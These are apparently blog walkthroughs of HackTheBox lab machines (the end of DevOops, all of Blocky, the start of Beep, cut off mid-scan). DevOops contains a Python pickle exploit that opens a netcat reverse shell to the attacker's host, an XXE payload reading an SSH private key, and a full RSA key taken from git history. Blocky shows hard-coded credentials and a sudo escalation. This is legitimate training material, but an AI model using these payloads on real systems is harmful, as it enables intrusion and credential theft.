<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://10.10.10.91:5000/newpost&quot;</span></span><br><span class="line">headers = &#123;<span class="string">&quot;Content-Type&quot;</span>: <span class="string">&quot;text/plain&quot;</span>&#125;</span><br><span class="line">code = <span class="string">&#x27;rm /tmp/x;mkfifo /tmp/x;cat /tmp/x|/bin/sh -i 2&gt;&amp;1|nc 10.10.16.99 9000 &gt;/tmp/x&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Devoops</span>(<span class="params">object</span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__reduce__</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="keyword">return</span> (os.system, (code,))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload = base64.urlsafe_b64encode(pickle.dumps(Devoops()))</span><br><span class="line">print(payload)</span><br><span class="line">r = requests.post(url=url, data=payload, headers=headers, allow_redirects=<span class="literal">False</span>)</span><br><span class="line">print(r.text)</span><br></pre></td></tr></table></figure>
<blockquote>
<p>一定要用Python2执行脚本，因为py2和py3序列化后的结果是完全不一样的</p>
</blockquote>
<p>本机监听端口</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ nc -lvvp 9000 </span><br><span class="line">listening on [any] 9000 ...</span><br><span class="line">10.10.10.91: inverse host lookup failed: Unknown host</span><br><span class="line">connect to [10.10.16.99] from (UNKNOWN) [10.10.10.91] 44014</span><br><span class="line">&#x2F;bin&#x2F;sh: 0: can&#39;t access tty; job control turned off</span><br><span class="line">$ id</span><br><span class="line">uid&#x3D;1002(roosa) gid&#x3D;1002(roosa) groups&#x3D;1002(roosa),4(adm),27(sudo)</span><br><span class="line">$ python -c &quot;import pty;pty.spawn(&#39;&#x2F;bin&#x2F;bash&#39;)&quot;</span><br><span class="line">roosa@gitter:~&#x2F;deploy&#x2F;src$ id</span><br><span class="line">id</span><br><span class="line">uid&#x3D;1002(roosa) gid&#x3D;1002(roosa) groups&#x3D;1002(roosa),4(adm),27(sudo)</span><br><span class="line">roosa@gitter:~&#x2F;deploy&#x2F;src$ cd &amp;&amp; ls -a user.txt</span><br><span class="line">cd &amp;&amp; ls -a user.txt</span><br><span class="line">user.txt</span><br></pre></td></tr></table></figure>
<p>还有一种更简单的方法。对于目标靶机只有只读的访问权限，<a href="https://digi.ninja/blog/when_all_you_can_do_is_read.php">这篇文章</a>提示了我们应查找的文件。 在这种情况下，我们可以访问roosa主目录的id_rsa文件：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE Author [&lt;!ENTITY  file SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;home&#x2F;roosa&#x2F;.ssh&#x2F;id_rsa&quot;&gt;]&gt;</span><br><span class="line">&lt;Author&gt;</span><br><span class="line">	&lt;Subject&gt;ca01h&lt;&#x2F;Subject&gt;</span><br><span class="line">	&lt;Content&gt;njupt&lt;&#x2F;Content&gt;</span><br><span class="line">	&amp;file;</span><br><span class="line">&lt;&#x2F;Author&gt;</span><br></pre></td></tr></table></figure>
<p>获取后保存到本机，用ssh登录靶机：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># kali @ kali in ~&#x2F;HackTheBox&#x2F;DevOops [2:01:04] </span><br><span class="line">$ chmod 600 id_rsa </span><br><span class="line"></span><br><span class="line"># kali @ kali in ~&#x2F;HackTheBox&#x2F;DevOops [2:01:19] </span><br><span class="line">$ ssh -i id_rsa roosa@10.10.10.91</span><br><span class="line">The authenticity of host &#39;10.10.10.91 (10.10.10.91)&#39; can&#39;t be established.</span><br><span class="line">ECDSA key fingerprint is SHA256:hbD2D4PdnIVpAFHV8sSAbtM0IlTAIpYZ&#x2F;nwspIdp4Vg.</span><br><span class="line">Are you sure you want to continue connecting (yes&#x2F;no&#x2F;[fingerprint])? yes</span><br><span class="line">Warning: Permanently added &#39;10.10.10.91&#39; (ECDSA) to the list of known hosts.</span><br><span class="line">Welcome to Ubuntu 16.04.4 LTS (GNU&#x2F;Linux 4.13.0-37-generic i686)</span><br><span class="line"></span><br><span class="line"> * Documentation:  https:&#x2F;&#x2F;help.ubuntu.com</span><br><span class="line"> * Management:     https:&#x2F;&#x2F;landscape.canonical.com</span><br><span class="line"> * Support:        https:&#x2F;&#x2F;ubuntu.com&#x2F;advantage</span><br><span class="line"></span><br><span class="line">135 packages can be updated.</span><br><span class="line">60 updates are security updates.</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">The programs included with the Ubuntu system are free software;</span><br><span class="line">the exact distribution terms for each program are described in the</span><br><span class="line">individual files in &#x2F;usr&#x2F;share&#x2F;doc&#x2F;*&#x2F;copyright.</span><br><span class="line"></span><br><span class="line">Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by</span><br><span class="line">applicable law.</span><br><span class="line"></span><br><span class="line">roosa@gitter:~$ id</span><br><span class="line">uid&#x3D;1002(roosa) gid&#x3D;1002(roosa) groups&#x3D;1002(roosa),4(adm),27(sudo)</span><br></pre></td></tr></table></figure>
<h3 id="Getting-Root-Flag">Getting Root Flag</h3>
<p>成功登录之后，看一下<code>.bash_history</code>，有几个关键的git命令</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">...</span><br><span class="line">mkdir integration&#x2F;auth_credentials.key</span><br><span class="line">nano integration&#x2F;auth_credentials.key&#x2F;</span><br><span class="line">ls -altr</span><br><span class="line">chmod go-rwx authcredentials.key</span><br><span class="line">...</span><br><span class="line">rm -Rf resources&#x2F;integration&#x2F;auth_credentials.key</span><br><span class="line">mv resources&#x2F;authcredentials.key resources&#x2F;integration&#x2F;</span><br><span class="line">git add resources&#x2F;integration&#x2F;authcredentials.key </span><br><span class="line">git commit -m &#39;add key for feed integration from tnerprise backend&#39;</span><br><span class="line">...</span><br><span class="line">ssh-keygen</span><br><span class="line">...</span><br><span class="line">cat kak</span><br><span class="line">cp kak resources&#x2F;integration&#x2F;authcredentials.key </span><br><span class="line">git add resources&#x2F;integration&#x2F;authcredentials.key </span><br><span class="line">git commit -m &#39;reverted accidental commit with proper key&#39;</span><br></pre></td></tr></table></figure>
<p>去git本地仓库看一下提交历史</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">roosa@gitter:~&#x2F;work&#x2F;blogfeed$ git log --pretty&#x3D;oneline</span><br><span class="line">7ff507d029021b0915235ff91e6a74ba33009c6d Use Base64 for pickle feed loading</span><br><span class="line">26ae6c8668995b2f09bf9e2809c36b156207bfa8 Set PIN to make debugging faster as it will no longer change every time the application code is changed. Remember to remove before production use.</span><br><span class="line">cec54d8cb6117fd7f164db142f0348a74d3e9a70 Debug support added to make development more agile.</span><br><span class="line">ca3e768f2434511e75bd5137593895bd38e1b1c2 Blogfeed app, initial version.</span><br><span class="line">dfebfdfd9146c98432d19e3f7d83cc5f3adbfe94 Gunicorn startup script</span><br><span class="line">33e87c312c08735a02fa9c796021a4a3023129ad reverted accidental commit with proper key</span><br><span class="line">d387abf63e05c9628a59195cec9311751bdb283f add key for feed integration from tnerprise backend</span><br><span class="line">1422e5a04d1b52a44e6dc81023420347e257ee5f Initial commit</span><br></pre></td></tr></table></figure>
<p>回退到第二个commit版本</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">roosa@gitter:~&#x2F;work&#x2F;blogfeed&#x2F;resources&#x2F;integration$ git reset --hard d387abf63e05c9628a59195cec9311751bdb283f</span><br><span class="line">HEAD is now at d387abf add key for feed integration from tnerprise backend</span><br><span class="line">roosa@gitter:~&#x2F;work&#x2F;blogfeed&#x2F;resources&#x2F;integration$ ls -la</span><br><span class="line">total 12</span><br><span class="line">drwxrwxr-x 2 roosa roosa 4096 Mar 30 02:42 .</span><br><span class="line">drwxrwxr-x 3 roosa roosa 4096 Mar 30 02:39 ..</span><br><span class="line">-rw-rw-r-- 1 roosa roosa 1676 Mar 30 02:42 authcredentials.key</span><br><span class="line">roosa@gitter:~&#x2F;work&#x2F;blogfeed&#x2F;resources&#x2F;integration$ cat authcredentials.key </span><br><span class="line">-----BEGIN RSA PRIVATE KEY-----</span><br><span class="line">MIIEogIBAAKCAQEArDvzJ0k7T856dw2pnIrStl0GwoU&#x2F;WFI+OPQcpOVj9DdSIEde</span><br><span class="line">8PDgpt&#x2F;tBpY7a&#x2F;xt3sP5rD7JEuvnpWRLteqKZ8hlCvt+4oP7DqWXoo&#x2F;hfaUUyU5i</span><br><span class="line">vr+5Ui0nD+YBKyYuiN+4CB8jSQvwOG+LlA3IGAzVf56J0WP9FILH&#x2F;NwYW2iovTRK</span><br><span class="line">nz1y2vdO3ug94XX8y0bbMR9Mtpj292wNrxmUSQ5glioqrSrwFfevWt&#x2F;rEgIVmrb+</span><br><span class="line">CCjeERnxMwaZNFP0SYoiC5HweyXD6ZLgFO4uOVuImILGJyyQJ8u5BI2mc&#x2F;SHSE0c</span><br><span class="line">F9DmYwbVqRcurk3yAS+jEbXgObupXkDHgIoMCwIDAQABAoIBAFaUuHIKVT+UK2oH</span><br><span class="line">uzjPbIdyEkDc3PAYP+E&#x2F;jdqy2eFdofJKDocOf9BDhxKlmO968PxoBe25jjjt0AAL</span><br><span class="line">gCfN5I+xZGH19V4HPMCrK6PzskYII3&#x2F;i4K7FEHMn8ZgDZpj7U69Iz2l9xa4lyzeD</span><br><span class="line">k2X0256DbRv&#x2F;ZYaWPhX+fGw3dCMWkRs6MoBNVS4wAMmOCiFl3hzHlgIemLMm6QSy</span><br><span class="line">NnTtLPXwkS84KMfZGbnolAiZbHAqhe5cRfV2CVw2U8GaIS3fqV3ioD0qqQjIIPNM</span><br><span class="line">HSRik2J&#x2F;7Y7OuBRQN+auzFKV7QeLFeROJsLhLaPhstY5QQReQr9oIuTAs9c+oCLa</span><br><span class="line">2fXe3kkCgYEA367aoOTisun9UJ7ObgNZTDPeaXajhWrZbxlSsOeOBp5CK&#x2F;oLc0RB</span><br><span class="line">GLEKU6HtUuKFvlXdJ22S4&#x2F;rQb0RiDcU&#x2F;wOiDzmlCTQJrnLgqzBwNXp+MH6Av9WHG</span><br><span class="line">jwrjv&#x2F;loHYF0vXUHHRVJmcXzsftZk2aJ29TXud5UMqHovyieb3mZ0pcCgYEAxR41</span><br><span class="line">IMq2dif3laGnQuYrjQVNFfvwDt1JD1mKNG8OppwTgcPbFO+R3+MqL7lvAhHjWKMw</span><br><span class="line">+XjmkQEZbnmwf1fKuIHW9uD9KxxHqgucNv9ySuMtVPp&#x2F;QYtjn&#x2F;ltojR16JNTKqiW</span><br><span class="line">7vSqlsZnT9jR2syvuhhVz4Ei9yA&#x2F;VYZG2uiCpK0CgYA&#x2F;UOhz+LYu&#x2F;MsGoh0+yNXj</span><br><span class="line">Gx+O7NU2s9sedqWQi8sJFo0Wk63gD+b5TUvmBoT+HD7NdNKoEX0t6VZM2KeEzFvS</span><br><span class="line">iD6fE+5&#x2F;i&#x2F;rYHs2Gfz5NlY39ecN5ixbAcM2tDrUo&#x2F;PcFlfXQhrERxRXJQKPHdJP7</span><br><span class="line">VRFHfKaKuof+bEoEtgATuwKBgC3Ce3bnWEBJuvIjmt6u7EFKj8CgwfPRbxp&#x2F;INRX</span><br><span class="line">S8Flzil7vCo6C1U8ORjnJVwHpw12pPHlHTFgXfUFjvGhAdCfY7XgOSV+5SwWkec6</span><br><span class="line">md&#x2F;EqUtm84&#x2F;VugTzNH5JS234dYAbrx498jQaTvV8UgtHJSxAZftL8UAJXmqOR3ie</span><br><span class="line">LWXpAoGADMbq4aFzQuUPldxr3thx0KRz9LJUJfrpADAUbxo8zVvbwt4gM2vsXwcz</span><br><span class="line">oAvexd1JRMkbC7YOgrzZ9iOxHP+mg&#x2F;LLENmHimcyKCqaY3XzqXqk9lOhA3ymOcLw</span><br><span class="line">LS4O7JPRqVmgZzUUnDiAVuUHWuHGGXpWpz9EGau6dIbQaUUSOEE&#x3D;</span><br><span class="line">-----END RSA PRIVATE KEY-----</span><br></pre></td></tr></table></figure>
<p>拷贝到本机保存，再用ssh登录靶机</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ chmod 600 root_id_rsa </span><br><span class="line"></span><br><span class="line"># kali @ kali in ~&#x2F;HackTheBox&#x2F;DevOops [2:44:48] </span><br><span class="line">$ ssh -i root_id_rsa root@10.10.10.91</span><br><span class="line">Welcome to Ubuntu 16.04.4 LTS (GNU&#x2F;Linux 4.13.0-37-generic i686)</span><br><span class="line"></span><br><span class="line"> * Documentation:  https:&#x2F;&#x2F;help.ubuntu.com</span><br><span class="line"> * Management:     https:&#x2F;&#x2F;landscape.canonical.com</span><br><span class="line"> * Support:        https:&#x2F;&#x2F;ubuntu.com&#x2F;advantage</span><br><span class="line"></span><br><span class="line">135 packages can be updated.</span><br><span class="line">60 updates are security updates.</span><br><span class="line"></span><br><span class="line">Last login: Mon Mar 26 06:23:48 2018 from 192.168.57.1</span><br><span class="line">root@gitter:~# id</span><br><span class="line">uid&#x3D;0(root) gid&#x3D;0(root) groups&#x3D;0(root)</span><br><span class="line">root@gitter:~# cat root.txt </span><br><span class="line">d4fe1e7f7187407eebdd3209cb1ac7b3</span><br></pre></td></tr></table></figure>
<h2 id="0x05-Reference">0x05 Reference</h2>
<p><a href="https://epi052.gitlab.io/notes-to-self/blog/2018-10-11-hack-the-box-devoops/">https://epi052.gitlab.io/notes-to-self/blog/2018-10-11-hack-the-box-devoops/</a></p>
]]></content>
      <categories>
        <category>靶机</category>
        <category>HTB</category>
      </categories>
      <tags>
        <tag>靶机</tag>
      </tags>
  </entry>
  <entry>
    <title>HTB::Blocky Walkthrough</title>
    <url>/Target_drone/HackTheBox/12.HTB-Blocky-walkthrough/</url>
    <content><![CDATA[<h1 id="HTB-Blocky-Walkthrough">HTB::Blocky Walkthrough</h1>
<h2 id="0x01-Info-Card">0x01 Info Card</h2>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200407105817.png" alt=""></p>
<h2 id="0x02-Tools-and-Tips">0x02 Tools and Tips</h2>
<ul>
<li>nmap</li>
<li>dirsearch</li>
<li>wpscan</li>
<li>jad</li>
</ul>
<h2 id="0x03-Pentesting">0x03 Pentesting</h2>
<h3 id="Initial-Enumeration">Initial Enumeration</h3>
<p>nmap scan</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Starting Nmap 7.80 ( https:&#x2F;&#x2F;nmap.org ) at 2019-11-14 10:54 CET</span><br><span class="line">  Nmap scan report for 10.10.10.37</span><br><span class="line">  Host is up (0.085s latency).</span><br><span class="line">  Not shown: 996 filtered ports</span><br><span class="line">  PORT     STATE  SERVICE VERSION</span><br><span class="line">  21&#x2F;tcp   open   ftp     ProFTPD 1.3.5a</span><br><span class="line">  22&#x2F;tcp   open   ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">  | ssh-hostkey:</span><br><span class="line">  |   2048 d6:2b:99:b4:d5:e7:53:ce:2b:fc:b5:d7:9d:79:fb:a2 (RSA)</span><br><span class="line">  |   256 5d:7f:38:95:70:c9:be:ac:67:a0:1e:86:e7:97:84:03 (ECDSA)</span><br><span class="line">  |_  256 09:d5:c2:04:95:1a:90:ef:87:56:25:97:df:83:70:67 (ED25519)</span><br><span class="line">  80&#x2F;tcp   open   http    Apache httpd 2.4.18 ((Ubuntu))</span><br><span class="line">  |_http-generator: WordPress 4.8</span><br><span class="line">  |_http-server-header: Apache&#x2F;2.4.18 (Ubuntu)</span><br><span class="line">  |_http-title: BlockyCraft – Under Construction!</span><br><span class="line">  8192&#x2F;tcp closed sophos</span><br><span class="line">  Service Info: OSs: Unix, Linux; CPE: cpe:&#x2F;o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">  Service detection performed. Please report any incorrect results at https:&#x2F;&#x2F;nmap.org&#x2F;submit&#x2F; .</span><br><span class="line">  Nmap done: 1 IP address (1 host up) scanned in 19.32 seconds</span><br></pre></td></tr></table></figure>
<p>dirsearch scan</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ .&#x2F;dirsearch.py -u 10.10.10.37 -e * </span><br><span class="line">[08:44:06] 301 -    0B  - &#x2F;index.php  -&gt;  http:&#x2F;&#x2F;10.10.10.37&#x2F;                                            </span><br><span class="line">[08:44:09] 301 -  315B  - &#x2F;javascript  -&gt;  http:&#x2F;&#x2F;10.10.10.37&#x2F;javascript&#x2F;</span><br><span class="line">[08:44:13] 200 -   19KB - &#x2F;license.txt               </span><br><span class="line">[08:44:37] 301 -  315B  - &#x2F;phpmyadmin  -&gt;  http:&#x2F;&#x2F;10.10.10.37&#x2F;phpmyadmin&#x2F;</span><br><span class="line">[08:44:41] 200 -   10KB - &#x2F;phpmyadmin&#x2F;               </span><br><span class="line">[08:44:42] 301 -  312B  - &#x2F;plugins  -&gt;  http:&#x2F;&#x2F;10.10.10.37&#x2F;plugins&#x2F;</span><br><span class="line">[08:44:46] 200 -    7KB - &#x2F;readme.html               </span><br><span class="line">[08:44:52] 403 -  299B  - &#x2F;server-status             </span><br><span class="line">[08:44:52] 403 -  300B  - &#x2F;server-status&#x2F;</span><br><span class="line">[08:45:21] 200 -  380B  - &#x2F;wiki&#x2F;</span><br><span class="line">[08:45:21] 301 -  313B  - &#x2F;wp-admin  -&gt;  http:&#x2F;&#x2F;10.10.10.37&#x2F;wp-admin&#x2F;</span><br><span class="line">[08:45:21] 301 -  309B  - &#x2F;wiki  -&gt;  http:&#x2F;&#x2F;10.10.10.37&#x2F;wiki&#x2F;</span><br><span class="line">[08:45:21] 302 -    0B  - &#x2F;wp-admin&#x2F;  -&gt;  http:&#x2F;&#x2F;10.10.10.37&#x2F;wp-login.php?redirect_to&#x3D;http%3A%2F%2F10.10.10.37%2Fwp-admin%2F&amp;reauth&#x3D;1</span><br><span class="line">[08:45:22] 200 -    1KB - &#x2F;wp-admin&#x2F;install.php</span><br><span class="line">[08:45:22] 500 -    4KB - &#x2F;wp-admin&#x2F;setup-config.php</span><br><span class="line">[08:45:22] 200 -    0B  - &#x2F;wp-content&#x2F;</span><br><span class="line">[08:45:22] 301 -  315B  - &#x2F;wp-content  -&gt;  http:&#x2F;&#x2F;10.10.10.37&#x2F;wp-content&#x2F;</span><br><span class="line">[08:45:23] 200 -   69B  - &#x2F;wp-content&#x2F;plugins&#x2F;akismet&#x2F;akismet.php</span><br><span class="line">[08:45:23] 200 -  965B  - &#x2F;wp-content&#x2F;uploads&#x2F;</span><br><span class="line">[08:45:23] 301 -  316B  - &#x2F;wp-includes  -&gt;  http:&#x2F;&#x2F;10.10.10.37&#x2F;wp-includes&#x2F;</span><br><span class="line">[08:45:23] 500 -    0B  - &#x2F;wp-includes&#x2F;rss-functions.php</span><br><span class="line">[08:45:23] 200 -    2KB - &#x2F;wp-login.php</span><br><span class="line">[08:45:23] 200 -   40KB - &#x2F;wp-includes&#x2F;</span><br><span class="line">[08:45:24] 405 -   42B  - &#x2F;xmlrpc.php                </span><br><span class="line"> </span><br><span class="line">Task Completed</span><br></pre></td></tr></table></figure>
<p>wpscan</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[i] User(s) Identified:</span><br><span class="line"></span><br><span class="line">[+] notch</span><br><span class="line"> | Found By: Author Posts - Author Pattern (Passive Detection)</span><br><span class="line"> | Confirmed By:</span><br><span class="line"> |  Wp Json Api (Aggressive Detection)</span><br><span class="line"> |   - http:&#x2F;&#x2F;10.10.10.37&#x2F;index.php&#x2F;wp-json&#x2F;wp&#x2F;v2&#x2F;users&#x2F;?per_page&#x3D;100&amp;page&#x3D;1</span><br><span class="line"> |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)</span><br><span class="line"> |  Login Error Messages (Aggressive Detection)</span><br><span class="line"></span><br><span class="line">[+] Notch</span><br><span class="line"> | Found By: Rss Generator (Passive Detection)</span><br><span class="line"> | Confirmed By: Login Error Messages (Aggressive Detection)</span><br><span class="line"></span><br><span class="line">[+] WPVulnDB API OK</span><br><span class="line"> | Plan: free</span><br><span class="line"> | Requests Done (during the scan): 3</span><br><span class="line"> | Requests Remaining: 47</span><br></pre></td></tr></table></figure>
<h3 id="Getting-User-Access">Getting User Access</h3>
<p>Visit <code>http://10.10.10.37/plugin</code></p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200407135726.png" alt=""></p>
<p>Download and extract <code>BlockyCore.jar</code>, once the <code>BlockCore.class</code> is extracted we need to do to print out it’s contents is to use the <strong>jad</strong> command.</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ jad BlockyCore.class</span><br><span class="line">Parsing BlockyCore.class...The class file version is 52.0 (only 45.3, 46.0 and 47.0 are supported)</span><br><span class="line">Generating BlockyCore.jad</span><br><span class="line"></span><br><span class="line">$ cat BlockyCore.jad</span><br><span class="line">&#x2F;&#x2F; Decompiled by Jad v1.5.8e. Copyright 2001 Pavel Kouznetsov.</span><br><span class="line">&#x2F;&#x2F; Jad home page: http:&#x2F;&#x2F;www.geocities.com&#x2F;kpdus&#x2F;jad.html</span><br><span class="line">&#x2F;&#x2F; Decompiler options: packimports(3)</span><br><span class="line">&#x2F;&#x2F; Source File Name:   BlockyCore.java                                                                                                                                     </span><br><span class="line">package com.myfirstplugin;</span><br><span class="line">public class BlockyCore</span><br><span class="line">&#123;</span><br><span class="line">    public BlockyCore()</span><br><span class="line">    &#123;</span><br><span class="line">        sqlHost &#x3D; &quot;localhost&quot;;</span><br><span class="line">        sqlUser &#x3D; &quot;root&quot;;</span><br><span class="line">        sqlPass &#x3D; &quot;8YsqfCTnvxAUeduzjNSXe22&quot;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public void onServerStart()</span><br><span class="line">    &#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public void onServerStop()</span><br><span class="line">    &#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public void onPlayerJoin()</span><br><span class="line">    &#123;</span><br><span class="line">        sendMessage(&quot;TODO get username&quot;, &quot;Welcome to the BlockyCraft!!!!!!!&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public void sendMessage(String s, String s1)</span><br><span class="line">    &#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public String sqlHost;</span><br><span class="line">    public String sqlUser;</span><br><span class="line">    public String sqlPass;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>Get the credentials: <code>notch : 8YsqfCTnvxAUeduzjNSXe22</code></p>
<p>SSH with notch</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ ssh notch@10.10.10.37</span><br><span class="line">notch@10.10.10.37&#39;s password:                                                         Welcome to Ubuntu 16.04.2 LTS (GNU&#x2F;Linux 4.4.0-62-generic x86_64)                     </span><br><span class="line"></span><br><span class="line"> * Documentation:  https:&#x2F;&#x2F;help.ubuntu.com</span><br><span class="line"> * Management:     https:&#x2F;&#x2F;landscape.canonical.com</span><br><span class="line"> * Support:        https:&#x2F;&#x2F;ubuntu.com&#x2F;advantage</span><br><span class="line"></span><br><span class="line">7 packages can be updated.</span><br><span class="line">7 updates are security updates.</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Last login: Tue Jul 25 11:14:53 2017 from 10.10.14.230</span><br><span class="line">notch@Blocky:~$ id</span><br><span class="line">uid&#x3D;1000(notch) gid&#x3D;1000(notch) groups&#x3D;1000(notch),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),110(lxd),115(lpadmin),116(sambashare)</span><br><span class="line">notch@Blocky:~$ ls</span><br><span class="line">minecraft  user.txt</span><br><span class="line">notch@Blocky:~$ cat user.txt </span><br><span class="line">59fee0977fb60b8a0bc6e41e751f3cd5</span><br></pre></td></tr></table></figure>
<h3 id="Getting-Root-Access">Getting Root Access</h3>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">notch@Blocky:~$ cat .bash_history </span><br><span class="line">sudo su</span><br><span class="line">cat .bash_history </span><br><span class="line">echo &quot;&quot; &gt; .bash_history </span><br><span class="line">exit</span><br><span class="line">poweroff</span><br><span class="line">sudo poweroff</span><br><span class="line">notch@Blocky:~$ sudo -l</span><br><span class="line">[sudo] password for notch: </span><br><span class="line">Matching Defaults entries for notch on Blocky:</span><br><span class="line">    env_reset, mail_badpass, secure_path&#x3D;&#x2F;usr&#x2F;local&#x2F;sbin\:&#x2F;usr&#x2F;local&#x2F;bin\:&#x2F;usr&#x2F;sbin\:&#x2F;usr&#x2F;bin\:&#x2F;sbin\:&#x2F;bin\:&#x2F;snap&#x2F;bin</span><br><span class="line"></span><br><span class="line">User notch may run the following commands on Blocky: </span><br><span class="line">    (ALL : ALL) ALL</span><br></pre></td></tr></table></figure>
<p>Get root flag</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">notch@Blocky:~$ cat &#x2F;root&#x2F;root.txt</span><br><span class="line">cat: &#x2F;root&#x2F;root.txt: Permission denied</span><br><span class="line">notch@Blocky:~$ sudo su</span><br><span class="line">root@Blocky:&#x2F;home&#x2F;notch# cat &#x2F;root&#x2F;root.txt</span><br></pre></td></tr></table></figure>
<h2 id="0x04-Conclusion">0x04 Conclusion</h2>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200407140623.png" alt=""></p>
<h2 id="0x05-Reference">0x05 Reference</h2>
<p><a href="https://ech1.netlify.com/htb/easy/1">https://ech1.netlify.com/htb/easy/1</a></p>
]]></content>
      <categories>
        <category>靶机</category>
        <category>HTB</category>
      </categories>
      <tags>
        <tag>靶机</tag>
      </tags>
  </entry>
  <entry>
    <title>HTB:Beep-walkthrough</title>
    <url>/Target_drone/HackTheBox/13.HTB-Beep-walkthrough/</url>
    <content><![CDATA[<h1 id="HTB-Beep-Walkthrough">HTB::Beep Walkthrough</h1>
<h2 id="0x01-Info-Card">0x01 Info Card</h2>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200407181830.png" alt=""></p>
<h2 id="0x02-Tools-and-Tips">0x02 Tools and Tips</h2>
<ul>
<li>nmap</li>
<li>sslscan</li>
<li>wfuzz</li>
<li>vtigercrm</li>
<li>LFI</li>
<li>Elastix / FreeFBX</li>
<li>Nmap Privilege Escalation</li>
</ul>
<h2 id="0x03-Pentesting">0x03 Pentesting</h2>
<h3 id="Initial-Enumeration">Initial Enumeration</h3>
<p>端口扫描</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># Nmap 7.80 scan initiated Tue Apr  7 03:18:33 2020 as: nmap -sC -sV -Pn -oN ippsec_scan.txt 10.10.10.7</span><br><span class="line">Nmap scan report for 10.10.10.7</span><br><span class="line">Host is up (0.25s latency).</span><br><span class="line">Not shown: 987 closed ports</span><br><span class="line">PORT      STATE SERVICE    VERSION</span><br><span class="line">22&#x2F;tcp    open  ssh        OpenSSH 4.3 (protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   1024 ad:ee:5a:bb:69:37:fb:27:af:b8:30:72:a0:f9:6f:53 (DSA)</span><br><span class="line">|_  2048 bc:c6:73:59:13:a1:8a:4b:55:07:50:f6:65:1d:6d:0d (RSA)</span><br><span class="line">25&#x2F;tcp    open  smtp       Postfix smtpd</span><br><span class="line">|_smtp-commands: beep.localdomain, PIPELINING, SIZE 10240000, VRFY, ETRN, ENHANCEDSTATUSCODES, 8BITMIME, DSN, </span><br><span class="line">80&#x2F;tcp    open  http       Apache httpd 2.2.3</span><br><span class="line">|_http-server-header: Apache&#x2F;2.2.3 (CentOS)</span><br><span class="line">|_http-title: Did not follow redirect to https:&#x2F;&#x2F;10.10.10.7&#x2F;</span><br><span class="line">|_https-redirect: ERROR: Script execution failed (use -d to debug)</span><br><span class="line">110&#x2F;tcp   open  pop3       Cyrus pop3d 2.3.7-Invoca-RPM-2.3.7-7.el5_6.4</span><br><span class="line">|_pop3-capabilities: TOP APOP UIDL IMPLEMENTATION(Cyrus POP3 server v2) LOGIN-DELAY(0) STLS RESP-CODES AUTH-RESP-CODE USER EXPIRE(NEVER) PIPELINING</span><br><span class="line">111&#x2F;tcp   open  rpcbind    2 (RPC #100000)</span><br><span class="line">143&#x2F;tcp   open  imap       Cyrus imapd 2.3.7-Invoca-RPM-2.3.7-7.el5_6.4</span><br><span class="line">|_imap-capabilities: THREAD&#x3D;REFERENCES ATOMIC Completed MAILBOX-REFERRALS OK RENAME LISTEXT LITERAL+ MULTIAPPEND X-NETSCAPE LIST-SUBSCRIBED CHILDREN UNSELECT RIGHTS&#x3D;kxte URLAUTHA0001 IDLE IMAP4rev1 SORT&#x3D;MODSEQ ID BINARY IMAP4 CONDSTORE CATENATE SORT ANNOTATEMORE NO UIDPLUS STARTTLS ACL NAMESPACE THREAD&#x3D;ORDEREDSUBJECT QUOTA</span><br><span class="line">443&#x2F;tcp   open  ssl&#x2F;https?</span><br><span class="line">|_ssl-date: 2020-04-07T07:23:36+00:00; +1m25s from scanner time.</span><br><span class="line">880&#x2F;tcp   open  status     1 (RPC #100024)</span><br><span class="line">993&#x2F;tcp   open  ssl&#x2F;imap   Cyrus imapd</span><br><span class="line">|_imap-capabilities: CAPABILITY</span><br><span 